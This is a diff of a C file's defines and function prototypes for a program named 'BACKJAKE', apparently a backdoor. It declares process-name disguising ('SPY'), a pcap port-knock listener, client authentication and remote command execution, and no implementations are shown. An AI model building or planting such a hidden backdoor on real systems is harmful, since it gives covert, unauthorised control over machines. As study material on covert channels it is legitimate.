@@ -28,11 +28,12 @@
 #define DEFAULT_SRC_IP		"192.168.0.25"
 #define OPTIONS 			"?h:d:s:p:"
 #define MAXLINE				80
-#define CMD					"tcp and src host %s and src port %d or udp"
+#define CMD					"tcp" // and src host %s and src port %d"
 #define TRUE				1
 #define FALSE				0
 
 int ExitFlag;
+int running;
 
 // Globals
 typedef struct
@@ -72,19 +73,19 @@ char * GetIPAddress (void);
 //SPY
 void disguise(char ** argv);
 char* getDisguise();
-void setDisguise(char * disguise, char * argv);
+void setDisguise(char * disguise, char ** argv);
 
 //BACKJAKE
 int main(int argc, char** argv);
+void initializeAddress(AddrInfo **Addr_Ptr);
 void initializeSocket(AddrInfo *Addr_Ptr);
-void initializePcap(PcapInfo *pcap_ptr, AddrInfo *Addr_Ptr);
+void initializePcap(PcapInfo **pcap_ptr, AddrInfo *Addr_Ptr);
+void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr);
 void initializeDoor(AddrInfo *Addr_Ptr);
 void checkArgs(int argc, char **argv);
 void usage(char ** argv);
 void setupSignals();
 void authenticateClient();
-static void endProgram (int signo);
-static void unlock (int signo);
 void* knockListener(void* pcap_arg);
 void executeCommand();
 void spawnThread();
